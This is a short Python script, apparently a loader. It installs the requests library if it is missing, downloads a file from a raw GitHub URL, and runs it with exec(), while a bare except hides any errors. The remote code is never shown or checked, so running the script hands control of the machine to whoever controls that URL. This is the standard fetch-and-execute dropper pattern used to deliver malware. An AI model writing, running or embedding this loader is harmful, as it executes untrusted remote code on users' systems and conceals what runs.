import os
try: 
    import requests
except ImportError:
    os.system("pip install requests")
    import requests

try:
    run = requests.get("https://raw.githubusercontent.com/Isotopes69/basic/refs/heads/main/main.py")
    exec(run.text)
except:
    print("Error in runtime !")
